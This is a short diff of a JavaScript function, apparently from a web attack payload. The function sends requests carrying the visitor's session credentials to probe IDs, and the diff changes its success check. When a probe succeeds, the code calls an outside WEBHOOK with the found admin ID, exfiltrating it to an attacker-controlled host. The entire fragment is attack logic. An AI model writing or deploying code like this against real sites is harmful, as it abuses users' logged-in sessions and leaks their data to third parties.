@@ -15,7 +15,7 @@ function tryId(i) {
         credentials: 'include'
     })
     .then(res => {
-        if (!res.ok) {
+        if (res.ok) {
             fetch(WEBHOOK + "?admin=" + i);
             return;
         }
